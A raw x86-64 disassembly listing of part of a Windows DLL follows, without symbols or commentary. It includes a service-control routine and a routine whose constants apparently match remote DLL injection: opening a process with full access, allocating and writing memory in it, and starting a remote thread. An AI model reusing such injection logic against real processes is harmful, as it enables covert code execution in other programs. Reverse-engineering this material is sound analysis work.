   180004ae4:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004aeb:	72 19                	jb     0x180004b06
   180004aed:	48 83 c2 27          	add    $0x27,%rdx
   180004af1:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   180004af5:	48 2b c1             	sub    %rcx,%rax
   180004af8:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004afc:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004b00:	0f 87 4e 01 00 00    	ja     0x180004c54
   180004b06:	e8 25 2e 01 00       	call   0x180017930
   180004b0b:	0f 10 45 d7          	movups -0x29(%rbp),%xmm0
   180004b0f:	0f 11 45 0f          	movups %xmm0,0xf(%rbp)
   180004b13:	0f 10 4d e7          	movups -0x19(%rbp),%xmm1
   180004b17:	0f 11 4d 1f          	movups %xmm1,0x1f(%rbp)
   180004b1b:	48 8b 4d ff          	mov    -0x1(%rbp),%rcx
   180004b1f:	ff 15 83 b8 03 00    	call   *0x3b883(%rip)        # 0x1800403a8
   180004b25:	4c 8b 45 07          	mov    0x7(%rbp),%r8
   180004b29:	49 8b c8             	mov    %r8,%rcx
   180004b2c:	ff 15 76 b8 03 00    	call   *0x3b876(%rip)        # 0x1800403a8
   180004b32:	48 8d 4d 0f          	lea    0xf(%rbp),%rcx
   180004b36:	4c 8b 45 0f          	mov    0xf(%rbp),%r8
   180004b3a:	48 8b 55 27          	mov    0x27(%rbp),%rdx
   180004b3e:	48 83 fa 08          	cmp    $0x8,%rdx
   180004b42:	49 0f 43 c8          	cmovae %r8,%rcx
   180004b46:	48 8b 45 1f          	mov    0x1f(%rbp),%rax
   180004b4a:	48 8d 34 41          	lea    (%rcx,%rax,2),%rsi
   180004b4e:	48 8d 5d 0f          	lea    0xf(%rbp),%rbx
   180004b52:	49 0f 43 d8          	cmovae %r8,%rbx
   180004b56:	4c 89 37             	mov    %r14,(%rdi)
   180004b59:	4c 89 77 10          	mov    %r14,0x10(%rdi)
   180004b5d:	48 c7 47 18 0f 00 00 	movq   $0xf,0x18(%rdi)
   180004b64:	00 
   180004b65:	c6 07 00             	movb   $0x0,(%rdi)
   180004b68:	48 8b c6             	mov    %rsi,%rax
   180004b6b:	48 2b c3             	sub    %rbx,%rax
   180004b6e:	48 d1 f8             	sar    $1,%rax
   180004b71:	48 83 f8 0f          	cmp    $0xf,%rax
   180004b75:	76 17                	jbe    0x180004b8e
   180004b77:	48 8b d0             	mov    %rax,%rdx
   180004b7a:	48 8b cf             	mov    %rdi,%rcx
   180004b7d:	e8 be 11 01 00       	call   0x180015d40
   180004b82:	4c 89 77 10          	mov    %r14,0x10(%rdi)
   180004b86:	48 8b 55 27          	mov    0x27(%rbp),%rdx
   180004b8a:	4c 8b 45 0f          	mov    0xf(%rbp),%r8
   180004b8e:	48 89 7d ff          	mov    %rdi,-0x1(%rbp)
   180004b92:	48 3b de             	cmp    %rsi,%rbx
   180004b95:	74 59                	je     0x180004bf0
   180004b97:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180004b9e:	00 00 
   180004ba0:	44 0f b6 0b          	movzbl (%rbx),%r9d
   180004ba4:	48 8b 4f 10          	mov    0x10(%rdi),%rcx
   180004ba8:	48 8b 57 18          	mov    0x18(%rdi),%rdx
   180004bac:	48 3b ca             	cmp    %rdx,%rcx
   180004baf:	73 1f                	jae    0x180004bd0
   180004bb1:	48 8d 41 01          	lea    0x1(%rcx),%rax
   180004bb5:	48 89 47 10          	mov    %rax,0x10(%rdi)
   180004bb9:	48 8b c7             	mov    %rdi,%rax
   180004bbc:	48 83 fa 10          	cmp    $0x10,%rdx
   180004bc0:	72 03                	jb     0x180004bc5
   180004bc2:	48 8b 07             	mov    (%rdi),%rax
   180004bc5:	44 88 0c 08          	mov    %r9b,(%rax,%rcx,1)
   180004bc9:	c6 44 08 01 00       	movb   $0x0,0x1(%rax,%rcx,1)
   180004bce:	eb 0f                	jmp    0x180004bdf
   180004bd0:	45 33 c0             	xor    %r8d,%r8d
   180004bd3:	41 8d 50 01          	lea    0x1(%r8),%edx
   180004bd7:	48 8b cf             	mov    %rdi,%rcx
   180004bda:	e8 a1 b8 00 00       	call   0x180010480
   180004bdf:	48 83 c3 02          	add    $0x2,%rbx
   180004be3:	48 3b de             	cmp    %rsi,%rbx
   180004be6:	75 b8                	jne    0x180004ba0
   180004be8:	48 8b 55 27          	mov    0x27(%rbp),%rdx
   180004bec:	4c 8b 45 0f          	mov    0xf(%rbp),%r8
   180004bf0:	48 83 fa 08          	cmp    $0x8,%rdx
   180004bf4:	72 31                	jb     0x180004c27
   180004bf6:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   180004bfd:	00 
   180004bfe:	49 8b c0             	mov    %r8,%rax
   180004c01:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180004c08:	72 15                	jb     0x180004c1f
   180004c0a:	48 83 c2 27          	add    $0x27,%rdx
   180004c0e:	4d 8b 40 f8          	mov    -0x8(%r8),%r8
   180004c12:	49 2b c0             	sub    %r8,%rax
   180004c15:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180004c19:	48 83 f8 1f          	cmp    $0x1f,%rax
   180004c1d:	77 2f                	ja     0x180004c4e
   180004c1f:	49 8b c8             	mov    %r8,%rcx
   180004c22:	e8 09 2d 01 00       	call   0x180017930
   180004c27:	48 8b c7             	mov    %rdi,%rax
   180004c2a:	48 8b 4d 37          	mov    0x37(%rbp),%rcx
   180004c2e:	48 33 cc             	xor    %rsp,%rcx
   180004c31:	e8 da 2c 01 00       	call   0x180017910
   180004c36:	4c 8d 9c 24 a0 00 00 	lea    0xa0(%rsp),%r11
   180004c3d:	00 
   180004c3e:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   180004c42:	49 8b 73 30          	mov    0x30(%r11),%rsi
   180004c46:	49 8b e3             	mov    %r11,%rsp
   180004c49:	41 5e                	pop    %r14
   180004c4b:	5f                   	pop    %rdi
   180004c4c:	5d                   	pop    %rbp
   180004c4d:	c3                   	ret
   180004c4e:	e8 ad b8 01 00       	call   0x180020500
   180004c53:	90                   	nop
   180004c54:	e8 a7 b8 01 00       	call   0x180020500
   180004c59:	90                   	nop
   180004c5a:	cc                   	int3
   180004c5b:	cc                   	int3
   180004c5c:	cc                   	int3
   180004c5d:	cc                   	int3
   180004c5e:	cc                   	int3
   180004c5f:	cc                   	int3
   180004c60:	40 53                	rex push %rbx
   180004c62:	48 83 ec 50          	sub    $0x50,%rsp
   180004c66:	48 8b 05 eb 23 05 00 	mov    0x523eb(%rip),%rax        # 0x180057058
   180004c6d:	48 33 c4             	xor    %rsp,%rax
   180004c70:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180004c75:	48 8d 1d 3c 30 05 00 	lea    0x5303c(%rip),%rbx        # 0x180057cb8
   180004c7c:	41 b8 0c 00 00 00    	mov    $0xc,%r8d
   180004c82:	48 8b cb             	mov    %rbx,%rcx
   180004c85:	48 8d 15 64 ad 04 00 	lea    0x4ad64(%rip),%rdx        # 0x18004f9f0
   180004c8c:	e8 0f 8c 00 00       	call   0x18000d8a0
   180004c91:	48 8d 0d e0 2f 05 00 	lea    0x52fe0(%rip),%rcx        # 0x180057c78
   180004c98:	48 3b cb             	cmp    %rbx,%rcx
   180004c9b:	74 1f                	je     0x180004cbc
   180004c9d:	48 83 3d 2b 30 05 00 	cmpq   $0x10,0x5302b(%rip)        # 0x180057cd0
   180004ca4:	10 
   180004ca5:	4c 8b 05 1c 30 05 00 	mov    0x5301c(%rip),%r8        # 0x180057cc8
   180004cac:	48 0f 43 1d 04 30 05 	cmovae 0x53004(%rip),%rbx        # 0x180057cb8
   180004cb3:	00 
   180004cb4:	48 8b d3             	mov    %rbx,%rdx
   180004cb7:	e8 e4 8b 00 00       	call   0x18000d8a0
   180004cbc:	48 8d 05 3d ad 04 00 	lea    0x4ad3d(%rip),%rax        # 0x18004fa00
   180004cc3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180004cc8:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180004ccd:	48 8d 05 2c 00 00 00 	lea    0x2c(%rip),%rax        # 0x180004d00
   180004cd4:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180004cd9:	33 c0                	xor    %eax,%eax
   180004cdb:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180004ce0:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180004ce5:	ff 15 1d b3 03 00    	call   *0x3b31d(%rip)        # 0x180040008
   180004ceb:	33 c0                	xor    %eax,%eax
   180004ced:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   180004cf2:	48 33 cc             	xor    %rsp,%rcx
   180004cf5:	e8 16 2c 01 00       	call   0x180017910
   180004cfa:	48 83 c4 50          	add    $0x50,%rsp
   180004cfe:	5b                   	pop    %rbx
   180004cff:	c3                   	ret
   180004d00:	40 53                	rex push %rbx
   180004d02:	48 83 ec 30          	sub    $0x30,%rsp
   180004d06:	48 8d 15 43 01 00 00 	lea    0x143(%rip),%rdx        # 0x180004e50
   180004d0d:	48 8d 0d ec ac 04 00 	lea    0x4acec(%rip),%rcx        # 0x18004fa00
   180004d14:	ff 15 e6 b2 03 00    	call   *0x3b2e6(%rip)        # 0x180040000
   180004d1a:	33 db                	xor    %ebx,%ebx
   180004d1c:	c7 05 a2 50 05 00 10 	movl   $0x10,0x550a2(%rip)        # 0x180059dc8
   180004d23:	00 00 00 
   180004d26:	48 8b c8             	mov    %rax,%rcx
   180004d29:	48 89 05 90 50 05 00 	mov    %rax,0x55090(%rip)        # 0x180059dc0
   180004d30:	48 8d 15 91 50 05 00 	lea    0x55091(%rip),%rdx        # 0x180059dc8
   180004d37:	48 89 1d 9e 50 05 00 	mov    %rbx,0x5509e(%rip)        # 0x180059ddc
   180004d3e:	48 c7 05 83 50 05 00 	movq   $0x2,0x55083(%rip)        # 0x180059dcc
   180004d45:	02 00 00 00 
   180004d49:	48 89 1d 84 50 05 00 	mov    %rbx,0x55084(%rip)        # 0x180059dd4
   180004d50:	ff 15 ba b2 03 00    	call   *0x3b2ba(%rip)        # 0x180040010
   180004d56:	45 33 c9             	xor    %r9d,%r9d
   180004d59:	8d 53 01             	lea    0x1(%rbx),%edx
   180004d5c:	45 33 c0             	xor    %r8d,%r8d
   180004d5f:	33 c9                	xor    %ecx,%ecx
   180004d61:	ff 15 c1 b2 03 00    	call   *0x3b2c1(%rip)        # 0x180040028
   180004d67:	48 89 05 02 2f 05 00 	mov    %rax,0x52f02(%rip)        # 0x180057c70
   180004d6e:	48 85 c0             	test   %rax,%rax
   180004d71:	75 35                	jne    0x180004da8
   180004d73:	48 c7 05 4e 50 05 00 	movq   $0x1,0x5504e(%rip)        # 0x180059dcc
   180004d7a:	01 00 00 00 
   180004d7e:	ff 15 ac b2 03 00    	call   *0x3b2ac(%rip)        # 0x180040030
   180004d84:	48 8b 0d 35 50 05 00 	mov    0x55035(%rip),%rcx        # 0x180059dc0
   180004d8b:	48 8d 15 36 50 05 00 	lea    0x55036(%rip),%rdx        # 0x180059dc8
   180004d92:	89 05 3c 50 05 00    	mov    %eax,0x5503c(%rip)        # 0x180059dd4
   180004d98:	c7 05 3a 50 05 00 01 	movl   $0x1,0x5503a(%rip)        # 0x180059ddc
   180004d9f:	00 00 00 
   180004da2:	ff 15 68 b2 03 00    	call   *0x3b268(%rip)        # 0x180040010
   180004da8:	48 8b 0d 11 50 05 00 	mov    0x55011(%rip),%rcx        # 0x180059dc0
   180004daf:	48 8d 15 12 50 05 00 	lea    0x55012(%rip),%rdx        # 0x180059dc8
   180004db6:	c7 05 10 50 05 00 01 	movl   $0x1,0x55010(%rip)        # 0x180059dd0
   180004dbd:	00 00 00 
   180004dc0:	c7 05 02 50 05 00 04 	movl   $0x4,0x55002(%rip)        # 0x180059dcc
   180004dc7:	00 00 00 
   180004dca:	89 1d 04 50 05 00    	mov    %ebx,0x55004(%rip)        # 0x180059dd4
   180004dd0:	89 1d 06 50 05 00    	mov    %ebx,0x55006(%rip)        # 0x180059ddc
   180004dd6:	ff 15 34 b2 03 00    	call   *0x3b234(%rip)        # 0x180040010
   180004ddc:	45 33 c9             	xor    %r9d,%r9d
   180004ddf:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   180004de4:	4c 8d 05 c5 23 00 00 	lea    0x23c5(%rip),%r8        # 0x1800071b0
   180004deb:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   180004def:	33 d2                	xor    %edx,%edx
   180004df1:	33 c9                	xor    %ecx,%ecx
   180004df3:	ff 15 3f b2 03 00    	call   *0x3b23f(%rip)        # 0x180040038
   180004df9:	48 8b c8             	mov    %rax,%rcx
   180004dfc:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   180004e01:	ff 15 39 b2 03 00    	call   *0x3b239(%rip)        # 0x180040040
   180004e07:	48 8b 0d 62 2e 05 00 	mov    0x52e62(%rip),%rcx        # 0x180057c70
   180004e0e:	ff 15 34 b2 03 00    	call   *0x3b234(%rip)        # 0x180040048
   180004e14:	48 8b 0d a5 4f 05 00 	mov    0x54fa5(%rip),%rcx        # 0x180059dc0
   180004e1b:	48 8d 15 a6 4f 05 00 	lea    0x54fa6(%rip),%rdx        # 0x180059dc8
   180004e22:	48 c7 05 9f 4f 05 00 	movq   $0x1,0x54f9f(%rip)        # 0x180059dcc
   180004e29:	01 00 00 00 
   180004e2d:	89 1d a1 4f 05 00    	mov    %ebx,0x54fa1(%rip)        # 0x180059dd4
   180004e33:	c7 05 9f 4f 05 00 03 	movl   $0x3,0x54f9f(%rip)        # 0x180059ddc
   180004e3a:	00 00 00 
   180004e3d:	ff 15 cd b1 03 00    	call   *0x3b1cd(%rip)        # 0x180040010
   180004e43:	48 83 c4 30          	add    $0x30,%rsp
   180004e47:	5b                   	pop    %rbx
   180004e48:	c3                   	ret
   180004e49:	cc                   	int3
   180004e4a:	cc                   	int3
   180004e4b:	cc                   	int3
   180004e4c:	cc                   	int3
   180004e4d:	cc                   	int3
   180004e4e:	cc                   	int3
   180004e4f:	cc                   	int3
   180004e50:	48 83 ec 28          	sub    $0x28,%rsp
   180004e54:	83 f9 01             	cmp    $0x1,%ecx
   180004e57:	75 4c                	jne    0x180004ea5
   180004e59:	83 3d 6c 4f 05 00 04 	cmpl   $0x4,0x54f6c(%rip)        # 0x180059dcc
   180004e60:	75 43                	jne    0x180004ea5
   180004e62:	48 8b 0d 57 4f 05 00 	mov    0x54f57(%rip),%rcx        # 0x180059dc0
   180004e69:	48 8d 15 58 4f 05 00 	lea    0x54f58(%rip),%rdx        # 0x180059dc8
   180004e70:	33 c0                	xor    %eax,%eax
   180004e72:	48 c7 05 4f 4f 05 00 	movq   $0x3,0x54f4f(%rip)        # 0x180059dcc
   180004e79:	03 00 00 00 
   180004e7d:	89 05 51 4f 05 00    	mov    %eax,0x54f51(%rip)        # 0x180059dd4
   180004e83:	c7 05 4f 4f 05 00 04 	movl   $0x4,0x54f4f(%rip)        # 0x180059ddc
   180004e8a:	00 00 00 
   180004e8d:	ff 15 7d b1 03 00    	call   *0x3b17d(%rip)        # 0x180040010
   180004e93:	48 8b 0d d6 2d 05 00 	mov    0x52dd6(%rip),%rcx        # 0x180057c70
   180004e9a:	48 83 c4 28          	add    $0x28,%rsp
   180004e9e:	48 ff 25 ab b1 03 00 	rex.W jmp *0x3b1ab(%rip)        # 0x180040050
   180004ea5:	48 83 c4 28          	add    $0x28,%rsp
   180004ea9:	c3                   	ret
   180004eaa:	cc                   	int3
   180004eab:	cc                   	int3
   180004eac:	cc                   	int3
   180004ead:	cc                   	int3
   180004eae:	cc                   	int3
   180004eaf:	cc                   	int3
   180004eb0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180004eb5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   180004eba:	56                   	push   %rsi
   180004ebb:	57                   	push   %rdi
   180004ebc:	41 56                	push   %r14
   180004ebe:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   180004ec5:	48 8b 05 8c 21 05 00 	mov    0x5218c(%rip),%rax        # 0x180057058
   180004ecc:	48 33 c4             	xor    %rsp,%rax
   180004ecf:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   180004ed4:	48 8b d9             	mov    %rcx,%rbx
   180004ed7:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
   180004edc:	48 8d 15 95 2d 05 00 	lea    0x52d95(%rip),%rdx        # 0x180057c78
   180004ee3:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180004ee8:	e8 f3 6c 00 00       	call   0x18000bbe0
   180004eed:	48 8b c8             	mov    %rax,%rcx
   180004ef0:	e8 eb f6 ff ff       	call   0x1800045e0
   180004ef5:	8b e8                	mov    %eax,%ebp
   180004ef7:	45 33 f6             	xor    %r14d,%r14d
   180004efa:	85 c0                	test   %eax,%eax
   180004efc:	0f 84 0e 02 00 00    	je     0x180005110
   180004f02:	48 83 7b 18 10       	cmpq   $0x10,0x18(%rbx)
   180004f07:	72 0c                	jb     0x180004f15
   180004f09:	48 8b 33             	mov    (%rbx),%rsi
   180004f0c:	48 8b fe             	mov    %rsi,%rdi
   180004f0f:	48 03 73 10          	add    0x10(%rbx),%rsi
   180004f13:	eb 0a                	jmp    0x180004f1f
   180004f15:	48 8b fb             	mov    %rbx,%rdi
   180004f18:	48 8b 73 10          	mov    0x10(%rbx),%rsi
   180004f1c:	48 03 f3             	add    %rbx,%rsi
   180004f1f:	4c 89 74 24 50       	mov    %r14,0x50(%rsp)
   180004f24:	49 8b ce             	mov    %r14,%rcx
   180004f27:	48 89 4c 24 60       	mov    %rcx,0x60(%rsp)
   180004f2c:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   180004f32:	4c 89 44 24 68       	mov    %r8,0x68(%rsp)
   180004f37:	66 44 89 74 24 50    	mov    %r14w,0x50(%rsp)
   180004f3d:	48 8b d6             	mov    %rsi,%rdx
   180004f40:	48 2b d7             	sub    %rdi,%rdx
   180004f43:	48 83 fa 08          	cmp    $0x8,%rdx
   180004f47:	72 17                	jb     0x180004f60
   180004f49:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180004f4e:	e8 dd 0a 01 00       	call   0x180015a30
   180004f53:	49 8b ce             	mov    %r14,%rcx
   180004f56:	48 89 4c 24 60       	mov    %rcx,0x60(%rsp)
   180004f5b:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   180004f60:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   180004f65:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180004f6a:	48 3b fe             	cmp    %rsi,%rdi
   180004f6d:	74 54                	je     0x180004fc3
   180004f6f:	90                   	nop
   180004f70:	44 0f be 0f          	movsbl (%rdi),%r9d
   180004f74:	49 3b c8             	cmp    %r8,%rcx
   180004f77:	73 25                	jae    0x180004f9e
   180004f79:	48 8d 41 01          	lea    0x1(%rcx),%rax
   180004f7d:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180004f82:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   180004f87:	49 83 f8 08          	cmp    $0x8,%r8
   180004f8b:	48 0f 43 44 24 50    	cmovae 0x50(%rsp),%rax
   180004f91:	66 44 89 0c 48       	mov    %r9w,(%rax,%rcx,2)
   180004f96:	66 44 89 74 48 02    	mov    %r14w,0x2(%rax,%rcx,2)
   180004f9c:	eb 11                	jmp    0x180004faf
   180004f9e:	45 33 c0             	xor    %r8d,%r8d
   180004fa1:	41 8d 50 01          	lea    0x1(%r8),%edx
   180004fa5:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180004faa:	e8 f1 0b 01 00       	call   0x180015ba0
   180004faf:	48 ff c7             	inc    %rdi
   180004fb2:	48 3b fe             	cmp    %rsi,%rdi
   180004fb5:	74 0c                	je     0x180004fc3
   180004fb7:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   180004fbc:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   180004fc1:	eb ad                	jmp    0x180004f70
   180004fc3:	44 8b c5             	mov    %ebp,%r8d
   180004fc6:	33 d2                	xor    %edx,%edx
   180004fc8:	b9 ff ff 1f 00       	mov    $0x1fffff,%ecx
   180004fcd:	ff 15 4d b0 03 00    	call   *0x3b04d(%rip)        # 0x180040020
   180004fd3:	48 8b f0             	mov    %rax,%rsi
   180004fd6:	48 8b cb             	mov    %rbx,%rcx
   180004fd9:	48 83 7b 18 10       	cmpq   $0x10,0x18(%rbx)
   180004fde:	72 03                	jb     0x180004fe3
   180004fe0:	48 8b 0b             	mov    (%rbx),%rcx
   180004fe3:	48 c7 c7 ff ff ff ff 	mov    $0xffffffffffffffff,%rdi
   180004fea:	4c 8b c7             	mov    %rdi,%r8
   180004fed:	0f 1f 00             	nopl   (%rax)
   180004ff0:	49 ff c0             	inc    %r8
   180004ff3:	42 80 3c 01 00       	cmpb   $0x0,(%rcx,%r8,1)
   180004ff8:	75 f6                	jne    0x180004ff0
   180004ffa:	49 ff c0             	inc    %r8
   180004ffd:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   180005004:	00 
   180005005:	33 d2                	xor    %edx,%edx
   180005007:	41 b9 00 10 00 00    	mov    $0x1000,%r9d
   18000500d:	48 8b ce             	mov    %rsi,%rcx
   180005010:	ff 15 42 b0 03 00    	call   *0x3b042(%rip)        # 0x180040058
   180005016:	48 8b e8             	mov    %rax,%rbp
   180005019:	48 83 7b 18 10       	cmpq   $0x10,0x18(%rbx)
   18000501e:	72 08                	jb     0x180005028
   180005020:	48 8b 0b             	mov    (%rbx),%rcx
   180005023:	4c 8b c1             	mov    %rcx,%r8
   180005026:	eb 06                	jmp    0x18000502e
   180005028:	4c 8b c3             	mov    %rbx,%r8
   18000502b:	48 8b cb             	mov    %rbx,%rcx
   18000502e:	4c 8b cf             	mov    %rdi,%r9
   180005031:	49 ff c1             	inc    %r9
   180005034:	42 80 3c 09 00       	cmpb   $0x0,(%rcx,%r9,1)
   180005039:	75 f6                	jne    0x180005031
   18000503b:	49 ff c1             	inc    %r9
   18000503e:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   180005043:	48 8b d5             	mov    %rbp,%rdx
   180005046:	48 8b ce             	mov    %rsi,%rcx
   180005049:	ff 15 11 b0 03 00    	call   *0x3b011(%rip)        # 0x180040060
   18000504f:	48 8d 0d d2 a9 04 00 	lea    0x4a9d2(%rip),%rcx        # 0x18004fa28
   180005056:	ff 15 7c b0 03 00    	call   *0x3b07c(%rip)        # 0x1800400d8
   18000505c:	48 8b c8             	mov    %rax,%rcx
   18000505f:	48 8d 15 b2 a9 04 00 	lea    0x4a9b2(%rip),%rdx        # 0x18004fa18
   180005066:	ff 15 04 b0 03 00    	call   *0x3b004(%rip)        # 0x180040070
   18000506c:	4c 8b c8             	mov    %rax,%r9
   18000506f:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   180005074:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   180005079:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   18000507e:	45 33 c0             	xor    %r8d,%r8d
   180005081:	33 d2                	xor    %edx,%edx
   180005083:	48 8b ce             	mov    %rsi,%rcx
   180005086:	ff 15 dc af 03 00    	call   *0x3afdc(%rip)        # 0x180040068
   18000508c:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   180005091:	48 8b c8             	mov    %rax,%rcx
   180005094:	ff 15 a6 af 03 00    	call   *0x3afa6(%rip)        # 0x180040040
   18000509a:	e8 b1 61 00 00       	call   0x18000b250
   18000509f:	48 8b c3             	mov    %rbx,%rax
   1800050a2:	48 83 7b 18 10       	cmpq   $0x10,0x18(%rbx)
   1800050a7:	72 07                	jb     0x1800050b0
   1800050a9:	48 8b 03             	mov    (%rbx),%rax
   1800050ac:	0f 1f 40 00          	nopl   0x0(%rax)
   1800050b0:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   1800050b4:	80 3c 38 00          	cmpb   $0x0,(%rax,%rdi,1)
   1800050b8:	75 f6                	jne    0x1800050b0
   1800050ba:	4c 8d 47 01          	lea    0x1(%rdi),%r8
   1800050be:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   1800050c4:	48 8b d5             	mov    %rbp,%rdx
   1800050c7:	48 8b ce             	mov    %rsi,%rcx
   1800050ca:	ff 15 b0 af 03 00    	call   *0x3afb0(%rip)        # 0x180040080
   1800050d0:	90                   	nop
   1800050d1:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   1800050d6:	48 83 fa 08          	cmp    $0x8,%rdx
   1800050da:	72 34                	jb     0x180005110
   1800050dc:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1800050e3:	00 
   1800050e4:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   1800050e9:	48 8b c1             	mov    %rcx,%rax
   1800050ec:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800050f3:	72 15                	jb     0x18000510a
   1800050f5:	48 83 c2 27          	add    $0x27,%rdx
   1800050f9:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1800050fd:	48 2b c1             	sub    %rcx,%rax
   180005100:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   180005104:	48 83 f8 1f          	cmp    $0x1f,%rax
   180005108:	77 70                	ja     0x18000517a
   18000510a:	e8 21 28 01 00       	call   0x180017930
   18000510f:	90                   	nop
   180005110:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   180005114:	48 83 fa 10          	cmp    $0x10,%rdx
   180005118:	72 2c                	jb     0x180005146
   18000511a:	48 ff c2             	inc    %rdx
   18000511d:	48 8b 0b             	mov    (%rbx),%rcx
   180005120:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180005127:	72 18                	jb     0x180005141
   180005129:	48 83 c2 27          	add    $0x27,%rdx
   18000512d:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   180005131:	49 2b c8             	sub    %r8,%rcx
   180005134:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   180005138:	48 83 f8 1f          	cmp    $0x1f,%rax
   18000513c:	77 42                	ja     0x180005180
   18000513e:	49 8b c8             	mov    %r8,%rcx
   180005141:	e8 ea 27 01 00       	call   0x180017930
   180005146:	4c 89 73 10          	mov    %r14,0x10(%rbx)
   18000514a:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   180005151:	00 
   180005152:	c6 03 00             	movb   $0x0,(%rbx)
   180005155:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   18000515a:	48 33 cc             	xor    %rsp,%rcx
   18000515d:	e8 ae 27 01 00       	call   0x180017910
   180005162:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   180005169:	00 
   18000516a:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   18000516e:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   180005172:	49 8b e3             	mov    %r11,%rsp
   180005175:	41 5e                	pop    %r14
   180005177:	5f                   	pop    %rdi
   180005178:	5e                   	pop    %rsi
   180005179:	c3                   	ret
   18000517a:	e8 81 b3 01 00       	call   0x180020500
   18000517f:	90                   	nop
   180005180:	e8 7b b3 01 00       	call   0x180020500
   180005185:	cc                   	int3
   180005186:	cc                   	int3
   180005187:	cc                   	int3
   180005188:	cc                   	int3
   180005189:	cc                   	int3
   18000518a:	cc                   	int3
   18000518b:	cc                   	int3
   18000518c:	cc                   	int3
   18000518d:	cc                   	int3
   18000518e:	cc                   	int3
   18000518f:	cc                   	int3
   180005190:	48 83 ec 38          	sub    $0x38,%rsp
   180005194:	48 8b 05 bd 1e 05 00 	mov    0x51ebd(%rip),%rax        # 0x180057058
   18000519b:	48 33 c4             	xor    %rsp,%rax
   18000519e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800051a3:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   1800051a8:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1800051af:	00 00 
   1800051b1:	48 8d 15 d8 ff ff ff 	lea    -0x28(%rip),%rdx        # 0x180005190
   1800051b8:	b9 06 00 00 00       	mov    $0x6,%ecx
   1800051bd:	ff 15 c5 ae 03 00    	call   *0x3aec5(%rip)        # 0x180040088
   1800051c3:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1800051c8:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1800051cd:	48 33 cc             	xor    %rsp,%rcx
   1800051d0:	e8 3b 27 01 00       	call   0x180017910
   1800051d5:	48 83 c4 38          	add    $0x38,%rsp
   1800051d9:	c3                   	ret
   1800051da:	cc                   	int3
   1800051db:	cc                   	int3
   1800051dc:	cc                   	int3
   1800051dd:	cc                   	int3
   1800051de:	cc                   	int3
   1800051df:	cc                   	int3
   1800051e0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800051e5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800051ea:	55                   	push   %rbp
   1800051eb:	57                   	push   %rdi
   1800051ec:	41 56                	push   %r14
   1800051ee:	48 8d ac 24 90 fe ff 	lea    -0x170(%rsp),%rbp
   1800051f5:	ff 
   1800051f6:	48 81 ec 70 02 00 00 	sub    $0x270,%rsp
   1800051fd:	48 8b 05 54 1e 05 00 	mov    0x51e54(%rip),%rax        # 0x180057058
   180005204:	48 33 c4             	xor    %rsp,%rax
   180005207:	48 89 85 60 01 00 00 	mov    %rax,0x160(%rbp)
   18000520e:	48 8b d9             	mov    %rcx,%rbx
   180005211:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180005216:	45 33 f6             	xor    %r14d,%r14d
